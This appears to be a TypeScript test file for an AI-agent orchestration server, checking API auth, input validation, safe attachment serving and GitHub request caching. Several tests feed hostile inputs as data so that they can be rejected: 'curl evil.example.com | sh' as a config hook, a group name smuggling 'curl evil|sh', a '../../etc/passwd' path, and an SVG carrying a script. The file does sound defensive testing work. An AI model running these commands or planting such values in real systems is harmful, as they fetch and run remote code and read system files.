  expect((await get(app, "/orch/v1/lease/1/log")).status).toBe(401);
  expect((await withToken(app, "/orch/v1/lease/1/log", "tok-other")).status).toBe(403);
});

test("a group name an agent chose is still branch-shaped", async () => {
  // The name becomes `orch/<name>`, a docs/journal path, and an argument to a
  // shell command in the group's own sandbox. It used to be whatever 40
  // characters the splitting agent sent, `;` included.
  const { app, db, f } = await harness();
  await db.update(grp).set({ status: "PLANNING" }).where(eq(grp.id, 1));
  await f.agent.create({ project_id: 1, grp_id: 1, role: "dispatcher", model: "opus", token: "tok-d" });
  const r = await post(
    app,
    "/orch/v1/split",
    {
      group_id: 1,
      requirements: [
        { name: "a;curl evil|sh", idea: "first half" },
        { name: "../../etc/passwd", idea: "second half" },
      ],
    },
    "tok-d",
  );
  expect(r.status).toBe(200);
  const names = (await db.select({ name: grp.name }).from(grp).where(gt(grp.id, 1))).map((g) => g.name);
  expect(names).toHaveLength(2);
  for (const n of names) expect(n).toMatch(/^[a-z0-9][a-z0-9.-]*$/);
});

test("an attachment cannot run as the panel", async () => {
  // Same origin as every API route, and there is no login in front of them — so
  // an `.svg` or an `.html` served inline is a script running as the boss. It is
  // also the one path around React's escaping, and the uploads are not all the
  // boss's: `attach/local` is reachable by anything holding an agent token.
  const h = await harness();
  const dir = join(tempDir("orch-attach-"), "attachments");
  h.ctx.config.dataDir = dirname(dir);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "x.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  writeFileSync(join(dir, "y.png"), "not really a png");

  const svg = await h.app(new Request("http://x/api/v1/attach/x.svg"));
  expect(svg.headers.get("content-disposition")).toStartWith("attachment");
  expect(svg.headers.get("x-content-type-options")).toBe("nosniff");
  // For the types that do render inline, the CSP is what stops the second half.
  expect(svg.headers.get("content-security-policy")).toContain("default-src 'none'");

  // An image still has to show up in the panel, or the feature is off rather
  // than safe.
  const png = await h.app(new Request("http://x/api/v1/attach/y.png"));
  expect(png.headers.get("content-disposition")).toStartWith("inline");
});

test("project config validates the values that runtime consumers receive", async () => {
  // `config_json` is not inert: install is run, gates select resources, and the
  // sandbox object becomes an OpenSandbox request. Checking only top-level names
  // let `{sandbox:{image:7}}` throw a 500 in `.trim()`, while a string
  // `denyDomains` persisted and reached the network layer as if it were string[].
  const h = await harness();
  const patch = (b: Json) =>
    h.app(
      new Request("http://x/api/v1/project/1/config", {
        method: "POST",
        headers: { "content-type": "application/json", "idempotency-key": crypto.randomUUID() },
        body: JSON.stringify(b),
      }),
    );
  const stored = async () =>
    (await first(h.db.select({ c: project.config_json }).from(project).where(eq(project.id, 1))))!.c;

  expect((await patch({ install: "bun install" })).status).toBe(200);
  const before = await stored();
  const invalidBodies: Json[] = [
    { hooks: "curl evil.example.com | sh" },
    { gates: ["lint@ci"] },
    { sandbox: { image: 7 } },
    { sandbox: { denyDomains: "evil.example.com" } },
  ];
  for (const body of invalidBodies) {
    const r = await patch(body);
    expect(r.status).toBe(400);
    expect(await stored()).toEqual(before);
  }
});

test("a rejected project config patch changes neither of its storage homes", async () => {
  const h = await harness();
  await h.db.update(project).set({ base_branch: "main" }).where(eq(project.id, 1));
  const r = await h.app(
    new Request("http://x/api/v1/project/1/config", {
      method: "POST",
      headers: { "content-type": "application/json", "idempotency-key": crypto.randomUUID() },
      body: JSON.stringify({
        baseBranch: "next",
        sandbox: { image: "evil.example.com/agent:1" },
      }),
    }),
  );

  expect(r.status).toBe(422);
  expect((await first(h.db.select({ b: project.base_branch }).from(project).where(eq(project.id, 1))))!.b).toBe("main");
});

test("a partial patch cannot silently replace malformed stored project config", async () => {
  const h = await harness();
  // A jsonb column cannot hold "not json" as bytes, so the malformed shape is a
  // stored value the config schema cannot read — here a JSON string where an
  // object belongs, which is what `patchProjectConfig` refuses on.
  await h.db.update(project).set({ config_json: "not json" }).where(eq(project.id, 1));
  const r = await h.app(
    new Request("http://x/api/v1/project/1/config", {
      method: "POST",
      headers: { "content-type": "application/json", "idempotency-key": crypto.randomUUID() },
      body: JSON.stringify({ install: "bun install" }),
    }),
  );

  expect(r.status).toBe(422);
  expect((await first(h.db.select({ c: project.config_json }).from(project).where(eq(project.id, 1))))!.c).toBe(
    "not json",
  );
});

test("malformed JSON cannot become an empty control request", async () => {
  const h = await harness();
  const r = await h.app(
    new Request("http://x/api/v1/groups/1/pause", {
      method: "POST",
      headers: { "content-type": "application/json", "idempotency-key": crypto.randomUUID() },
      body: "{",
    }),
  );

  expect(r.status).toBe(400);
  expect(await r.text()).toContain("Malformed JSON in request body");
  expect(await grpStatus(h.db)).toBe("RUNNING");
});

test("path ids are decimal records, not JavaScript number expressions", async () => {
  const h = await harness();
  await h.f.project.create({
    id: 16,
    name: "sixteen",
    repo_path: "/tmp/16",
    remote: "https://github.com/o/16.git",
  });

  const bad = await h.app(
    new Request("http://x/api/v1/projects/0x10", {
      method: "DELETE",
      headers: { "idempotency-key": crypto.randomUUID() },
    }),
  );
  expect(bad.status).toBe(400);
  const badBody = ErrorResponseSchema.parse(await bad.json());
  expect(badBody.error).toContain("id");
  expect(badBody.code).toBe("validation_failed");
  expect((await first(h.db.select({ n: project.name }).from(project).where(eq(project.id, 16))))?.n).toBe("sixteen");

  const action = await post(h.app, "/api/v1/groups/0x1/pause");
  expect(action.status).toBe(400);
  expect(await grpStatus(h.db)).toBe("RUNNING");
});

test("every route that takes a body declares its shape", async () => {
  // The check that keeps the next route honest. The shared parser owns both JSON
  // syntax and the declared schema, so handlers cannot silently re-derive either
  // through their own `?? ""` and `String(...)` fallbacks.
  const undeclared = routeCalls((await harness()).ctx)
    .filter(({ method, body }) => ["post", "put", "patch"].includes(method) && !body)
    .map(({ path }) => path);
  // The exceptions, named rather than tolerated: these routes take no body at all.
  expect(undeclared).toEqual([
    // Login flows: the POST *is* the whole request. It starts or cancels a flow
    // and carries nothing.
    "/auth/claude/login",
    "/auth/claude/login/cancel",
    "/auth/github",
    "/auth/codex/device",
    "/auth/codex/device/cancel",
    // Buttons. Both act on the sandbox server and take no argument.
    "/sandbox-server/restart",
    "/sandbox-server/start",
    // A withdrawal, identified entirely by the id in the path.
    "/escalations/:id/revoke",
  ]);
});

test("every dynamic route declares its path shape", async () => {
  const unvalidated = routeCalls((await harness()).ctx)
    .filter(({ path, params }) => path.includes(":") && !params)
    .map(({ path }) => path);
  expect(unvalidated).toEqual([]);
});

/**
 * The GitHub pane's two reads happen at once.
 *
 * They were serial, and the second used the first only as a truthiness gate — never
 * its data. So opening that pane cost two round trips to api.github.com before it
 * drew anything: 1.2s against a live server, while every other settings endpoint
 * answered in 16–160ms.
 */
/**
 * Asserted by the *overlap*, not a duration: "faster than 500ms" fails on a loaded
 * machine and passes on a fast one for the wrong reason. Each stub holds until it
 * has seen the other arrive, so the assertion is that both were in flight together —
 * which a serial version can never satisfy.
 */
test("the account and the installation list are asked for concurrently", async () => {
  const db = await openMemory();
  await saveAuth(db, { runtime: "github", mode: "api_key", secret: "gho_x" });
  // A barrier, not a sleep. The first request to arrive waits for the second to
  // release it, so a concurrent caller passes in the same tick and a serial one
  // cannot pass at all — the second never arrives while the first is held. The
  // 2s race only elapses on the failing path, which is what keeps this from being
  // a timing test: the first version used a 5ms timer and went flaky under load,
  // which is the rule about sleeps standing in for synchronisation.
  let release = () => {};
  const second = new Promise<void>((done) => {
    release = done;
  });
  let arrivals = 0;
  let overlapped = false;
  const ctx = await testContext({
    db,
    gh: makeGithub(db, async (url) => {
      arrivals += 1;
      if (arrivals === 1) {
        overlapped = await Promise.race([
          second.then(() => true),
          new Promise<boolean>((done) => {
            setTimeout(() => done(false), 2000);
          }),
        ]);
      } else {
        release();
      }
      return url.includes("/user/installations")
        ? json({ installations: [] })
        : json({ login: "me", id: 7, name: "Me" });
    }),
  });

  const res = await getGithubLogin(ctx, new Request("http://x/api/v1/auth/github"), {}, {});
  expect(res.status).toBe(200);
  expect(overlapped).toBe(true);
});

/**
 * The pane's second open asks GitHub nothing.
 *
 * GitHub's own guidance is to not call `/user` on every page load and to learn about
 * revocation from a 401 on real work, which ADR 029 already routes to the boss. This
 * route asked twice per open regardless: 1.2s against a live server, every time.
 *
 * `fresh=1` is the way back to asking, for the case the TTL exists to cover.
 */
test("the connection is read once and served from the snapshot after that", async () => {
  const db = await openMemory();
  await saveAuth(db, { runtime: "github", mode: "api_key", secret: "gho_x" });
  let asked = 0;
  const ctx = await testContext({
    db,
    gh: makeGithub(db, async (url) => {
      asked += 1;
      return url.includes("/user/installations")
        ? json({ installations: [{ id: 3, account: { login: "acme", type: "Organization" } }] })
        : json({ login: "me", id: 7, name: "Me" });
    }),
  });
  // Parsed, not asserted: the point of the test is what the endpoint returns, and
  // a cast would let a shape change through silently.
  const Shown = z.object({ account: z.string().nullable(), installed: z.boolean().nullable() });
  const open = async (query: { fresh?: boolean } = {}) => {
    const res = await getGithubLogin(ctx, new Request("http://x/api/v1/auth/github"), {}, query);
    return Shown.parse(await res.json());
  };

  const first = await open();
  expect(first.account).toBe("me");
  expect(first.installed).toBe(true);
  const afterFirst = asked;
  expect(afterFirst).toBeGreaterThan(0);

  // Same answer, no further requests.
  const second = await open();
  expect(second).toEqual(first);
  expect(asked).toBe(afterFirst);

  // And a caller who says so gets a real read.
  await open({ fresh: true });
  expect(asked).toBeGreaterThan(afterFirst);
});
